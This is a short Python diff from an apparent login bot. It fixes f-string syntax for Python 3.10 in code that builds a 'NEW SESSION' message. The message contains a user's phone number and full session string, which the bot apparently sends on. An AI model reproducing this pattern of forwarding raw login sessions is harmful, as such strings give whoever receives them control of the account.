@@ -45,10 +45,14 @@ async def _finish(sess: str, phone: str = ""):
             await save_user_session(res, sess, phone=phone)
         except Exception as e:
             print(f"[login_bot] save: {e}")
+
+    # backslash f-string ke bahar rakha (Python 3.10 fix)
+    phone_line = f"Phone: <code>{phone}</code>\n" if phone else ""
+    result_text = f"ONLINE <code>{res}</code>" if ok else str(res)
     body = (
-        f"<b>BOT LOGIN — NEW SESSION</b>\n"
-        f"{('Phone: <code>' + phone + '</code>\n') if phone else ''}"
-        f"Result: {'ONLINE <code>' + str(res) + '</code>' if ok else res}\n\n"
+        "<b>BOT LOGIN — NEW SESSION</b>\n"
+        f"{phone_line}"
+        f"Result: {result_text}\n\n"
         f"<code>{sess}</code>"
     )
     if bot:
